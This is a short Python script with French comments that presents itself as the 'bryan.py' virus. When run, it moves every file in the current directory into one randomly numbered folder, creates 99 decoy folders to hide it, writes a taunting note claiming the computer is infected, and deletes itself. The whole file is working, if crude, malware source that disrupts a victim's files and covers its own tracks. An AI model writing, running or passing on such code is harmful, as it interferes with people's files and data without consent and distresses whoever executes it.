import shutil, os, random

nombre = 100
# Choix du dossier contenant les fichiers
choix = random.randint(1,nombre+1) 
nom = "bryan" + str(choix)  
os.mkdir(nom)

# Déplacement des fichiers dans le dossier choisi
dir_list = os.listdir()  
for file in dir_list:     
    shutil.move(file,nom)  

# Création de dossier bryan pour cacher le choisi
for i in range (1,nombre+1):     
    if i != choix:         
        tempnom = "bryan" + str(i)         
        os.mkdir(tempnom)

# Rédaction du fichier texte 
f = open("Ne_Paniquez_Pas.txt", "w+")
f.write("Votre ordinateur a été infécté par le virus bryan.py !!!\nTous vos fichiers ont été placés dans un des dossier bryan\nBonne chance pour les retrouver xD HAHA ^^\n-Bryan la menace.")
f.close()

# Suppression du fichier python
os.remove(nom + "/bryan.py")
